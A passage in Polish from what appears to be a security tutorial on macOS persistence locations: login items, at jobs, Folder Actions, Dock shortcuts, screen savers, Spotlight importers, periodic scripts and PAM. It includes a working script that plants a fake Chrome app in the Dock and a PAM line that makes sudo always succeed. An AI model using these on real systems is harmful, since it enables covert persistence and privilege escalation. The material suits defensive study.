```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Te elementy są przechowywane w pliku **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** mogą być również wskazywane za pomocą API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), które zapisze konfigurację w **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP jako Login Item

(Sprawdź poprzednią sekcję dotyczącą Login Items; jest to jej rozszerzenie)

Jeśli zapiszesz plik **ZIP** jako **Login Item**, **`Archive Utility`** otworzy go, a jeśli ZIP był na przykład przechowywany w **`~/Library`** i zawierał folder **`LaunchAgents/file.plist`** z backdoorem, folder ten zostanie utworzony (domyślnie go nie ma), a plik plist zostanie dodany, dzięki czemu przy następnym logowaniu użytkownika **backdoor wskazany w pliku plist zostanie wykonany**.

Inną opcją byłoby utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu HOME użytkownika, dzięki czemu ta technika nadal działałaby, jeśli folder LaunchAgents już istnieje.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Musisz jednak **wykonać** **`at`**, a funkcja musi być **włączona**
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz **wykonać** **`at`**, a funkcja musi być **włączona**

#### **Opis**

Zadania `at` służą do **planowania jednorazowych zadań**, które zostaną wykonane o określonych porach. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Należy pamiętać, że zadania te pozostają aktywne po ponownym uruchomieniu systemu, co w określonych warunkach czyni je potencjalnym zagrożeniem bezpieczeństwa.<sup>[[16]](#references)</sup>

**Domyślnie** są **wyłączone**, ale użytkownik **root** może je **włączyć** za pomocą:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Spowoduje to utworzenie pliku za 1 godzinę:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Sprawdź kolejkę zadań za pomocą `atq`:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Powyżej widzimy dwa zaplanowane zadania. Szczegóły zadania możemy wyświetlić za pomocą `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Jeśli zadania AT nie są włączone, utworzone zadania nie zostaną wykonane.

**Pliki zadań** można znaleźć w `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Nazwa pliku zawiera kolejkę, numer zadania oraz czas, na który zaplanowano jego wykonanie. Weźmy na przykład `a0001a019bdcd2`.

- `a` - to kolejka
- `0001a` - numer zadania w systemie szesnastkowym, `0x1a = 26`
- `019bdcd2` - czas w systemie szesnastkowym. Reprezentuje liczbę minut, które upłynęły od epoki. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Jeśli pomnożymy tę wartość przez 60, otrzymamy `1619509560`, czyli `GMT: 27 kwietnia 2021, wtorek, 7:46:00`.

Jeśli wyświetlimy plik zadania, okaże się, że zawiera on te same informacje, które uzyskaliśmy za pomocą `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Musisz jednak mieć możliwość wywołania `osascript` z argumentami, aby skontaktować się z **`System Events`** i skonfigurować Folder Actions
- Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Ma podstawowe uprawnienia TCC, takie jak Desktop, Documents i Downloads

#### Lokalizacja

- **`/Library/Scripts/Folder Action Scripts`**
- Wymagane uprawnienia root
- **Wyzwalacz**: dostęp do określonego folderu
- **`~/Library/Scripts/Folder Action Scripts`**
- **Wyzwalacz**: dostęp do określonego folderu

#### Opis i wykorzystanie

Folder Actions to skrypty automatycznie wyzwalane przez zmiany w folderze, takie jak dodawanie lub usuwanie elementów, a także inne działania, na przykład otwieranie lub zmiana rozmiaru okna folderu. Actions te można wykorzystywać do różnych zadań i wyzwalać na różne sposoby, na przykład za pomocą interfejsu Finder lub poleceń terminala.<sup>[[17]](#references)[[18]](#references)</sup>

Aby skonfigurować Folder Actions, możesz skorzystać z następujących opcji:

1. Utworzenie workflow Folder Action za pomocą [Automator](https://support.apple.com/guide/automator/welcome/mac) i zainstalowanie go jako usługi.
2. Ręczne przypisanie skryptu za pomocą Folder Actions Setup w menu kontekstowym folderu.
3. Wykorzystanie OSAScript do wysyłania komunikatów Apple Event do `System Events.app` w celu programowego skonfigurowania Folder Action.
- Ta metoda jest szczególnie przydatna do osadzenia action w systemie, zapewniając pewien poziom persistence.

Poniższy skrypt jest przykładem tego, co może zostać wykonane przez Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Aby powyższy skrypt mógł być używany przez Folder Actions, skompiluj go za pomocą:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Po skompilowaniu skryptu skonfiguruj Folder Actions, wykonując poniższy skrypt. Ten skrypt globalnie włączy Folder Actions i konkretnie przypisze wcześniej skompilowany skrypt do folderu Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Uruchom skrypt konfiguracyjny za pomocą:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- W ten sposób można wdrożyć tę persistence za pomocą GUI:

To jest skrypt, który zostanie wykonany:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Skompiluj go za pomocą: `osacompile -l JavaScript -o folder.scpt source.js`

Przenieś go do:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz monitorować**, a w swoim przypadku wybierz **`folder.scpt`** (w moim przypadku nazwałem go output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Teraz, jeśli otworzysz ten folder za pomocą **Finder**, Twój skrypt zostanie wykonany.

Ta konfiguracja była przechowywana w pliku **plist** znajdującym się w **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**, w formacie base64.

Spróbujmy teraz przygotować tę persistence bez dostępu do GUI:

1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby utworzyć kopię zapasową:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Usuń** właśnie skonfigurowane Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Teraz mamy puste środowisko

3. Skopiuj plik kopii zapasowej: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otwórz Folder Actions Setup.app, aby wczytać tę konfigurację: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> To jednak u mnie nie zadziałało, ale poniżej znajdują się instrukcje z writeup:(

### Skróty Docka

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Musisz jednak mieć zainstalowaną malicious application w systemie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: gdy użytkownik kliknie aplikację znajdującą się w Docku

#### Opis i exploitation

Wszystkie aplikacje pojawiające się w Docku są określone w pliku plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Możliwe jest **dodanie aplikacji** za pomocą:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Wykorzystując pewne techniki **social engineering**, możesz **podszyć się na przykład pod Google Chrome** w Docku i faktycznie uruchomić własny skrypt:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Selektory kolorów

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Przydatne do ominięcia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Musi nastąpić bardzo konkretna akcja
- Trafisz do innego sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/Library/ColorPickers`
- Wymagany root
- Trigger: Użycie selektora kolorów
- `~/Library/ColorPickers`
- Trigger: Użycie selektora kolorów

#### Opis i exploit

**Skompiluj** bundle selektora kolorów ze swoim kodem (możesz na przykład użyć [**this one for example**](https://github.com/viktorstrate/color-picker-plus)), dodaj constructor (tak jak w sekcji [Screen Saver](macos-auto-start-locations.md#screen-saver)) i skopiuj bundle do `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Następnie, gdy zostanie wywołany selektor kolorów, Twój bundle również powinien się wykonać.

Zauważ, że plik binarny ładujący Twoją bibliotekę działa w **bardzo restrykcyjnym sandboxie**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Przydatne do obejścia sandbox: **Nie, ponieważ musisz uruchomić własną aplikację**
- TCC bypass: ???

#### Lokalizacja

- Konkretna aplikacja

#### Opis i exploit

Przykład aplikacji z Finder Sync Extension [**można znaleźć tutaj**](https://github.com/D00MFist/InSync).

Aplikacje mogą mieć `Finder Sync Extensions`. To rozszerzenie znajduje się wewnątrz aplikacji, która zostanie uruchomiona. Ponadto, aby rozszerzenie mogło wykonywać swój kod, **musi być podpisane** ważnym certyfikatem dewelopera Apple, musi być **sandboxed** (chociaż można dodać mniej restrykcyjne wyjątki) i musi być zarejestrowane za pomocą czegoś takiego jak:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Wygaszacz ekranu

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
- Jednak ostatecznie trafisz do typowego sandboxa aplikacji
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/System/Library/Screen Savers`
- Wymagane uprawnienia root
- **Wyzwalacz**: Wybierz wygaszacz ekranu
- `/Library/Screen Savers`
- Wymagane uprawnienia root
- **Wyzwalacz**: Wybierz wygaszacz ekranu
- `~/Library/Screen Savers`
- **Wyzwalacz**: Wybierz wygaszacz ekranu

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i exploit

Utwórz nowy projekt w Xcode i wybierz szablon, aby wygenerować nowy **Screen Saver**. Następnie dodaj do niego swój kod, na przykład poniższy kod do generowania logów.<sup>[[23]](#references)[[24]](#references)</sup>

Skompiluj go (**Build**) i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz GUI wygaszacza ekranu i po prostu go kliknij — powinien wygenerować wiele logów:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Zauważ, że ponieważ w entitlements pliku binarnego, który ładuje ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), znajduje się **`com.apple.security.app-sandbox`**, będziesz znajdować się we wspólnym sandboxie aplikacji.

Kod savera:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Wtyczki Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Przydatne do bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Jednak zakończysz w application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox wygląda na bardzo ograniczony

#### Lokalizacja

- `~/Library/Spotlight/`
- **Trigger**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez plugin Spotlight.
- `/Library/Spotlight/`
- **Trigger**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez plugin Spotlight.
- Wymagany root
- `/System/Library/Spotlight/`
- **Trigger**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez plugin Spotlight.
- Wymagany root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez plugin Spotlight.
- Wymagana nowa aplikacja

#### Opis i Exploitation

Spotlight to wbudowana funkcja wyszukiwania systemu macOS, zaprojektowana w celu zapewnienia użytkownikom **szybkiego i kompleksowego dostępu do danych na ich komputerach**.\
Aby umożliwić szybkie wyszukiwanie, Spotlight utrzymuje **własnościową bazę danych** i tworzy indeks poprzez **parsowanie większości plików**, umożliwiając szybkie wyszukiwanie zarówno nazw plików, jak i ich zawartości.<sup>[[25]](#references)</sup>

Podstawowy mechanizm Spotlight obejmuje centralny proces o nazwie „mds”, co oznacza **„metadata server”**. Proces ten koordynuje działanie całej usługi Spotlight. Uzupełnia go wiele daemonów „mdworker”, które wykonują różnorodne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Zadania te są możliwe dzięki pluginom importerów Spotlight, czyli **„bundles .mdimporter”**, które umożliwiają Spotlight rozumienie i indeksowanie zawartości szerokiego zakresu formatów plików.

Pluginy lub bundls **`.mdimporter`** znajdują się w wymienionych wcześniej miejscach, a jeśli pojawi się nowy bundle, zostanie załadowany w ciągu minuty (nie ma potrzeby restartowania żadnej usługi). Bundles muszą wskazywać, **jakimi typami plików i rozszerzeniami mogą zarządzać**; dzięki temu Spotlight użyje ich, gdy zostanie utworzony nowy plik ze wskazanym rozszerzeniem.

Możliwe jest **znalezienie wszystkich załadowanych `mdimporters`** za pomocą polecenia:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** służy do analizowania tego typu plików (między innymi rozszerzeń `.iba` i `.book`):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Jeśli sprawdzisz Plist innego `mdimporter`, możesz nie znaleźć wpisu **`UTTypeConformsTo`**. Dzieje się tak, ponieważ jest to wbudowany _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier) — identyfikator typu jednolitego) i nie musi określać rozszerzeń.
>
> Ponadto domyślne wtyczki systemowe zawsze mają pierwszeństwo, więc attacker może uzyskać dostęp tylko do plików, które nie są indeksowane przez własne `mdimporters` firmy Apple.

Aby utworzyć własny importer, możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a następnie zmienić nazwę, **`CFBundleDocumentTypes`** i dodać **`UTImportedTypeDeclarations`**, aby obsługiwał rozszerzenie, które chcesz obsługiwać, oraz odzwierciedlić je w **`schema.xml`**.\
Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby wykonywała payload po utworzeniu pliku z przetwarzanym rozszerzeniem.

Na koniec **zbuduj i skopiuj nowy `.mdimporter`** do jednej z trzech wcześniejszych lokalizacji. Możesz sprawdzić, czy został załadowany, **monitorując logi** lub uruchamiając **`mdimport -L`**.

### ~~Panel preferencji~~

> [!CAUTION]
> Wygląda na to, że to już nie działa.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
- Wymaga określonej akcji użytkownika
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Wygląda na to, że to już nie działa.<sup>[[26]](#references)</sup>

## Obejście Root Sandbox

> [!TIP]
> Tutaj znajdziesz lokalizacje autostartu przydatne do **obejścia sandboxa**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku** jako **root** i/lub wymagają innych **nietypowych warunków.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
- Musisz jednak być rootem
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Wymagany root
- **Trigger**: Gdy nadejdzie odpowiedni czas
- `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`
- Wymagany root
- **Trigger**: Gdy nadejdzie odpowiedni czas

#### Opis i Exploitation

Skrypty periodic (**`/etc/periodic`**) są wykonywane z powodu **launch daemons** skonfigurowanych w `/System/Library/LaunchDaemons/com.apple.periodic*`. Należy pamiętać, że skrypty przechowywane w `/etc/periodic/` są **wykonywane** jako **właściciel pliku**, więc nie zadziała to w przypadku potencjalnego privilege escalation.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
W **`/etc/defaults/periodic.conf`** wskazano inne skrypty okresowe, które zostaną wykonane:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Jeśli uda Ci się zapisać którykolwiek z plików `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`, zostanie on **prędzej czy później wykonany**.

> [!WARNING]
> Pamiętaj, że skrypt periodic zostanie **wykonany jako właściciel skryptu**. Jeśli więc skrypt należy do zwykłego użytkownika, zostanie wykonany jako ten użytkownik (może to uniemożliwić ataki privilege escalation).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
- Wymagane są jednak uprawnienia root
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Zawsze wymagany jest root

#### Opis i exploitation

Ponieważ PAM koncentruje się bardziej na **persistence** i malware niż na łatwym wykonywaniu wewnątrz macOS, ten blog nie zawiera szczegółowego wyjaśnienia — **przeczytaj writeupy, aby lepiej zrozumieć tę technikę**.<sup>[[28]](#references)</sup>

Sprawdź moduły PAM za pomocą:
```bash
ls -l /etc/pam.d
```
Technika persistence/privilege escalation wykorzystująca PAM jest tak prosta jak zmodyfikowanie modułu /etc/pam.d/sudo poprzez dodanie na początku linii:
```bash
auth       sufficient     pam_permit.so
```
Będzie to więc **wyglądać** mniej więcej tak:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
I dlatego każda próba użycia **`sudo` zakończy się powodzeniem**.

> [!CAUTION]
> Pamiętaj, że ten katalog jest chroniony przez TCC, więc istnieje duże prawdopodobieństwo, że użytkownik zobaczy monit z prośbą o dostęp.

Kolejnym dobrym przykładem jest `su`, gdzie można zobaczyć, że możliwe jest również przekazywanie parametrów do modułów PAM (można też dodać backdoora do tego pliku):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Wtyczki autoryzacji

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Przydatne do ominięcia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Wymagany jest jednak root i dodatkowa konfiguracja
- TCC bypass: ???

#### Lokalizacja

- `/Library/Security/SecurityAgentPlugins/`
- Wymagany root
- Konieczne jest również skonfigurowanie authorization database w celu użycia pluginu

#### Opis i Exploitation

